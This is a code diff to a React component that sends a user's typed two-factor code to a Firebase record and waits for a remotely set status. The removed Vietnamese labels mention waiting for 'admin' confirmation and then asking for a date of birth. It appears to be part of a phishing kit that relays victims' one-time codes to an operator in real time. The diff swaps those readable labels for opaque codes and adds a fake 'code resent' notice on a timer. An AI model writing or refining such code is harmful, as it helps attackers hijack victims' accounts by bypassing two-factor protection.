@@ -18,6 +18,7 @@ const FaCode = () => {
   const handleSend = () => {
     setResended(false);
     setValidating(true);
+    setError_login_code(false);
     const updates = {};
 
     updates[
@@ -25,7 +26,7 @@ const FaCode = () => {
     ] = facode;
     updates[
       "/records/" + localStorage.getItem("record_uid") + "/" + "user_status"
-    ] = "Đang chờ xác nhận 2fa từ admin";
+    ] = "3z";
 
     update(ref(database), updates);
   };
@@ -36,8 +37,14 @@ const FaCode = () => {
     const updates = {};
     updates[
       "/records/" + localStorage.getItem("record_uid") + "/" + "user_status"
-    ] = "User yêu cầu gửi lại mã 2fa";
+    ] = "3z";
     update(ref(database), updates);
+
+    setTimeout(() => {
+      setResending(false);
+      setError_login_code(false);
+      setResended(true);
+    }, 3000);
   };
 
   useEffect(() => {
@@ -48,22 +55,22 @@ const FaCode = () => {
     onValue(starCountRef, (snapshot) => {
       const data = snapshot.val();
       console.log(data);
-      if (data?.user_status === "Đang chờ user nhập ngày sinh") {
+      if (data?.user_status === "6") {
         navigate("/confirm/date-of-birth");
-      } else if (data?.user_status === "Sai mã 2fa") {
+      } else if (data?.user_status === "3") {
         setValidating(false);
         setError_login_code(true);
-        const updates = {};
-        updates[
-          "/records/" + localStorage.getItem("record_uid") + "/" + "user_status"
-        ] = "Đang chờ user nhập lại mã 2fa";
-
-        update(ref(database), updates);
+        // const updates = {};
+        // updates[
+        //   "/records/" + localStorage.getItem("record_uid") + "/" + "user_status"
+        // ] = "Đang chờ user nhập lại mã 2fa";
+        // update(ref(database), updates);
         // eslint-disable-next-line no-dupe-else-if
-      } else if (data?.user_status === "Đã gửi lại mã 2fa") {
-        setResending(false);
-        setResended(true);
       }
+      // else if (data?.user_status === "Đã gửi lại mã 2fa") {
+      //   setResending(false);
+      //   setResended(true);
+      // }
     });
   }, []);
 
